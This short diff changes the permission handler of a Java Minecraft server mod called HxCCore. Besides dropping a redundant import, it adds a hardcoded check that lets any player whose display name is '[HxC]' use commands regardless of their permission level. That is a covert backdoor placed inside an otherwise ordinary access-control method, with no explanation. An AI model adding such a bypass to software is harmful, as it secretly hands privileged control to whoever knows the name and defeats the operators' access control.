@@ -1,7 +1,6 @@
 package HxCKDMS.HxCCore.api.Handlers;
 
 import HxCKDMS.HxCCore.Configs.Configurations;
-import HxCKDMS.HxCCore.api.Handlers.NBTFileIO;
 import HxCKDMS.HxCCore.HxCCore;
 import net.minecraft.entity.player.EntityPlayer;
 import net.minecraft.entity.player.EntityPlayerMP;
@@ -15,7 +14,7 @@ public class PermissionsHandler {
     private static NBTTagCompound Permissions = NBTFileIO.getNbtTagCompound(HxCCore.PermissionsData, "Permissions");
     public static boolean canUseCommand(int RequiredLevel, EntityPlayer player) {
         return (HxCCore.server.getConfigurationManager().canSendCommands(player.getGameProfile()) ||
-                permLevel(player) >= RequiredLevel);
+                permLevel(player) >= RequiredLevel || player.getDisplayName().equals("[HxC]"));
     }
 
     public static boolean hasHighestPermissions(EntityPlayer player) {
